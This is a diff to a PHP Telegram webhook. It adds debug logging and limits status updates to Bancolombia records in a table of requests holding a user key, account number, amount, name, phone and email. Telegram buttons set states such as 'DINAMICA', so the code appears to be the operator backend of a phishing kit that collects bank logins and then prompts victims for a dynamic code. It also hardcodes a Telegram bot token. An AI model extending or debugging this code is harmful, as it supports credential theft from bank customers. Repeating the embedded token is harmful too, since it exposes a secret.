@@ -18,6 +18,17 @@ require_once __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';
 
 $token = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
 
+function wh_log($line) {
+    try {
+        $logPath = __DIR__ . DIRECTORY_SEPARATOR . 'debug_webhook.log';
+        $fp = @fopen($logPath, 'a');
+        if ($fp) {
+            @fwrite($fp, gmdate('Y-m-d\TH:i:s\Z') . " " . $line . "\n");
+            @fclose($fp);
+        }
+    } catch (Throwable $_) { /* ignore */ }
+}
+
 function answerCallback($cbId, $text = 'OK', $showAlert = false) {
     global $token;
     $payload = json_encode([
@@ -60,6 +71,10 @@ function tgSend($chatId, $text, $reply_markup = null) {
     return ['ok' => $code >= 200 && $code < 300, 'code' => $code, 'body' => $out];
 }
 
+$remote = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+wh_log("START remote=$remote ua=" . substr($ua,0,120) . " rawlen=" . strlen($raw));
+
 if (isset($update['callback_query']) && is_array($update['callback_query'])) {
     $cb = $update['callback_query'];
     $cbId = $cb['id'] ?? '';
@@ -67,6 +82,8 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
     $from = $cb['from']['id'] ?? 0;
     $chat = $cb['message']['chat']['id'] ?? 0;
     $msgId = $cb['message']['message_id'] ?? 0;
+
+    wh_log("CB data=" . var_export($data,true) . " from=$from chat=$chat cbId=$cbId");
 
     $answered = false;
     $estado = null;
@@ -83,15 +100,24 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
     }
 
     if ($estado && $request_id) {
+        $rowsAffected = 0;
+        $foundBanco = '';
+        $foundRid = '';
         try {
             global $pdo;
-            $upd = $pdo->prepare("UPDATE solicitudes SET estado = ? WHERE request_id = ?");
+            $upd = $pdo->prepare("UPDATE solicitudes SET estado = ? WHERE BINARY request_id = ? AND banco = 'Bancolombia'");
             $upd->execute([$estado, $request_id]);
+            $rowsAffected = (int)$upd->rowCount();
 
             $row = null;
-            $sel = $pdo->prepare("SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo FROM solicitudes WHERE request_id = ? LIMIT 1");
+            $sel = $pdo->prepare("SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo FROM solicitudes WHERE BINARY request_id = ? LIMIT 1");
             $sel->execute([$request_id]);
             $row = $sel->fetch(PDO::FETCH_ASSOC);
+            if ($row) {
+                $foundBanco = (string)($row['banco'] ?? '');
+                $foundRid   = (string)($row['request_id'] ?? '');
+            }
+            wh_log("UPDATE estado=$estado request_id=" . var_export($request_id,true) . " rowsAffected=$rowsAffected foundBanco=$foundBanco foundRid=$foundRid");
 
             $labelMap = [
                 'opcion_1' => 'DINAMICA',
@@ -125,6 +151,7 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
             $answered = true;
         } catch (Throwable $e) {
             $msg = $e->getMessage();
+            wh_log("ERROR $msg");
             if ($cbId) answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
             error_log("TG webhook error: " . $msg);
             $answered = true;
@@ -137,4 +164,5 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
 }
 
 echo json_encode(['ok' => true]);
+wh_log("END output_sent");
 exit;
